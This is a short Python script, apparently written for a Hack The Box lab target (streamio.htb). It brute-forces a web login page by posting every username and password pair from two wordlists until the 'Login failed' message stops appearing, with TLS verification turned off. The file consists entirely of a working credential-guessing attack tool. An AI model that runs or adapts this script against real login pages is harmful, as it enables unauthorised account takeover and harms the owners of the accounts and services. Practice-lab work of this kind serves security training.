import requests,sys,warnings

warnings.filterwarnings("ignore")

target_url = "https://streamio.htb/login.php"       # Target login url
username_file = "names.txt"                         # List of users
password_file = "passwords.txt"                     # List of passwords
failure_response_check = "Login failed"             # Failure string to check for in response


def gather_user_n_pass(pass_file: str, user_file: str) -> list:
    
    pass_list = []
    user_list = []
    
    with open(pass_file,'r') as temp_read:
        for line in temp_read.readlines():
            pass_list.append(line.strip('\n'))

    with open(user_file,'r') as temp_read:
        for line in temp_read.readlines():
            user_list.append(line.strip('\n'))

    return pass_list, user_list


def login_request(url: str, username: str, password: str, session: classmethod) -> bool:

    credentials = {"username":username,"password":password}
    response = session.post(url,data=credentials,verify=False)

    if failure_response_check in response.text:
        return False
    else:
        return True


def main() -> None:

    p_list, u_list = gather_user_n_pass(password_file,username_file)

    sess = requests.Session()

    for user in u_list:

        for passw in p_list:

            print(f"[+] Attempting -- {user}:{passw}")
            resp = login_request(target_url, user, passw, sess)

            if resp:
                print(f"\n[+][+][+] Login successful: {user}:{passw} [+][+][+]")
                sys.exit()
            else:
                continue


if __name__ == "__main__":
    
    try:
        main()
    
    except KeyboardInterrupt:
        print("[+] ...exiting")
        sys.exit()
    
    except ConnectionRefusedError as e:
        # Handle connection refused errors (server not listening)
        print(f"Connection refused: {e}")
        sys.exit()

    except Exception as e:
        print(e.with_traceback(None))
        print("[+] Error occured...exiting")
        sys.exit()